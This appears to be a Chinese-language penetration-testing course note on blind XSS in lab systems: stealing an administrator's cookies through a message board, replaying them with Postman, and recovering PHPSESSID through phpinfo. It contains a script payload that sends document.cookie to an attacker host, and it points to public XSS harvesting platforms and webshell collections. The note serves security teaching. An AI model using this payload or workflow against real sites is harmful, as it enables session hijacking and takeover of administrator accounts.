![](https://gitee.com/YatJay/image/raw/master/img/202203022011002.png)

# 涉及知识

## XSS漏洞利用的要点

### XSS的核心

网站管理者后台会查看我们提交的数据，抓住这一点，这一点就是成为跨站攻击的点

### XSS应用场景

- 留言板
- 评论区
- 订单系统
- 反馈条件等

## XSS平台及工具使用

### 在线XSS平台

https://xss.pt/xss.php——优先

https://xss8.cc/——有时没有响应

也可参考《Web安全攻防：渗透测实战指南》第二章的内容，自己搭建XSS平台

## Session与Cookie获取问题

### XSS获取到的Cookie不能直接用来登录网站后台

对比XSS获得的Cookie和管理员浏览器中直接拿到的Cookie

XSS平台中得到的Cookie

```
cookie : ant[uname]=admin; ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815; PHPSESSID=cd5380a5bb4c679e5c76da76891b16b3
```

使用此Cookie成功登录pikachu的XSS盲打后台

![](https://gitee.com/YatJay/image/raw/master/img/202203041443036.png)

管理员浏览器直接获取到的Cookie值

```
Cookie
ant[uname]=admin; ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815; PHPSESSID=cd5380a5bb4c679e5c76da76891b16b3
```

使用此Cookie也可以成功登录pikachu的XSS盲打后台

以上测试，两种方法得到的Cookie值无差别，但是**有时XSS获取到的Cookie值相比直接拿到的Cookie值，会缺少一个字段，即PHPSESSID字段(JSP脚本网站则为JSPSESSID)**

如果目标网站使用Session进行验证，那么盗取Cookie进行攻击登录是无效的，如果XSS接收不到PHPSESSID值，就无法登录管理员后台。比如删除PHPSESSID字段后进行登录后台失败

![](https://gitee.com/YatJay/image/raw/master/img/202203041455887.png)

一般地，若使用SESSION进行用户验证，会在后台代码中写明，比如jfdd的管理员验证部分代码如下

```php
<?php 
session_start(); //要验证SESSION，看是不是管理员
if($_SESSION["admin"]!="jfdd"){

	echo "<script>location.href='../';</script>";
    exit;
}
?>
```

#### PHPSESSID字段的获取——配合读取phpinfo等信息源码等

如果对方服务器使用Session验证，无法通过XSS一次性得到PHPSESSID，则在对方服务器构造phpinfo页面，当中提到Cookie值时会记录PHPSESSID值，可以为我们所用

![](https://gitee.com/YatJay/image/raw/master/img/202203041502641.png)

具体思路为让对方的跨站漏洞访问我们构造的phpinfo文件，将访问结果返回，读取返回结果后获得PHPSESSID，在线XSS平台也具备此功能即返回页面源码模块

![](https://gitee.com/YatJay/image/raw/master/img/202203041506773.png)

用此模块提供的脚本，访问我们上传的phpinfo页面并返回结果，从返回结果中得到PHPSESSID，但是此方法比较鸡肋。

# 演示案例

## 某营销订单系统XSS盲打—平台

配置环境：在本地网站根目录，按照说明，安装军锋真人CS野战在线预订系统安装程序V1.0

![](https://gitee.com/YatJay/image/raw/master/img/202203031030361.png)

在线XSS平台https://xss.pt/xss.php，注册并创建新项目，只勾选默认模块即可

找一个获取XSS语句，本XSS目的是获取网站管理员Cookie

![](https://gitee.com/YatJay/image/raw/master/img/202203031753781.png)

复制XSS语句粘贴到目标网站留言板，提交留言

![](https://gitee.com/YatJay/image/raw/master/img/202203031754213.png)

到管理员后台查看，查看前端代码，可见已经触发XSS语句

![](https://gitee.com/YatJay/image/raw/master/img/202203031757544.png)

在XSS平台可以看到获取到了管理员Cookie

![](https://gitee.com/YatJay/image/raw/master/img/202203031758896.png)

## 工具Http/s数据包提交Postman使用

接上述获取到的Cookie，使用Postman工具，利用Cookie进行登录

这里我们使用本地浏览器的原始Cookie值而不是XSS平台中获取到的Cookie值(原因后面再说，此处演示使用Postman带Cookie值进行访问的流程)

复制本地浏览器原始Cookie

![](https://gitee.com/YatJay/image/raw/master/img/202203031811439.png)

使用Postman工具带Cookie值(浏览器原始Cookie值)进行访问

![](https://gitee.com/YatJay/image/raw/master/img/202203031814002.png)

点击send进行访问，可以成功进入管理员后台

![](https://gitee.com/YatJay/image/raw/master/img/202203031815539.png)

**注意**：此处带Cookie值访问网站后台使用的是从(管理员的)浏览器获得的原始Cookie，而非在XSS平台收到的Cookie值。仅做带Cookie访问网站后台的演示操作，原因后续讲解。

## 不使用在线XSS平台—手写代码

获取Cookie的核心代码为`document.cookie`的值，只需提交XSS脚本使得目标网站把`document.cookie`的结果返回到攻击者的机器上

前台如留言板提交的XSS脚本示例如下：

```js
<script>location.href="http://192.168.132.144/cookie.php?cookie="+document.cookie</script>
```

意思是将目标网站的Cookie值，以GET方式提交到攻击者主机`192.168.132.144`的`cookie.php`文件，由`cookie.php`来处理捕获的Cookie信息

在攻击方查看cookie.php的处理结果，比如是将收到的Cookie值写入某个文件当中等

详细见：[XSS提取cookie到远程服务器](https://blog.css8.cn/post/13058394.html)

## 某Shell箱子系统XSS盲打—工具

00:34:00–01:02:00

## Kali Linux的Beef-Xss漏洞利用框架的使用

见于补充内容中的工具使用目录下，如下链接

[Kali Linux的Beef-Xss漏洞利用框架的使用](../Part0 补充内容/03_工具使用/Kali的BeEF-XSS安装与使用)

# 涉及资源

http://xss.fbisb.com/

https://github.com/tennc/webshell

https://www.postman.com/downloads/

XSS-订单系统.zip (428 KB) ：https://pan.baidu.com/s/1lIUZvEVXs1du-Bmkt7-abA 提取码：xiao 

WEBSHELL箱子系统V2.0.rar (65 KB)：https://pan.baidu.com/s/13H4N1VTBVwd3t8YWpECBFw 提取码：xiao 
